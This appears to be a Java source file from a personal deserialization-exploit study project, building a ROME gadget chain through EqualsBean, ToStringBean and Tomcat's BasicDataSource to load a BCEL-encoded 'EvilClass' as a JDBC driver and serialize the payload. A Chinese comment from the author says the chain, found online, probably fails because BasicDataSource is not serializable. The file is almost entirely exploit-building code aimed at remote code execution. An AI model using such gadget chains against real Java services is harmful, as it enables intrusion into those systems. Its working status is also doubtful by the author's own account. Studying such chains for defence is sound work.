import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;

import com.sun.org.apache.bcel.internal.util.ClassLoader;
import java.util.HashMap;

import static util.Util.*;

/**
 * @Description
 * @Author dragonkeep
 * @Date 2025/1/13
 */

/*
* * HashMap.readObject()
 *   ObjectBean.hashCode()
 *       EqualsBean.beanHashCode()
 *           ToStringBean.toString()
 *              BasicDataSource.getConnection()
 *                  createDataSource()
 *                      createConnectionFactory()
 *                         createDriver()
 *
*
* */
    /*
    * 这个链子是网上无意看到的，我自己试了一下感觉是不太行，虽然链子很通顺，但是BasicDataSource关键类没有继承反序列化接口
    * */
public class ROME_BasicDataSource {
    public static void main(String[] args) throws Exception{
        BasicDataSource basicDataSource = new BasicDataSource();
        ClassLoader classLoader = new ClassLoader();
        basicDataSource.setDriverClassLoader(classLoader);
        String BeclString = Object2Becl("ROME/target/classes/util/EvilClass.class");
        basicDataSource.setDriverClassName(BeclString);
        ToStringBean toStringBean = new ToStringBean(BasicDataSource.class,basicDataSource);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);
        HashMap<Object,Object> hashmap = new HashMap<>();
        hashmap.put(equalsBean, "dragonkeep");
        serialize(hashmap);
        //unserialize();
    }
}
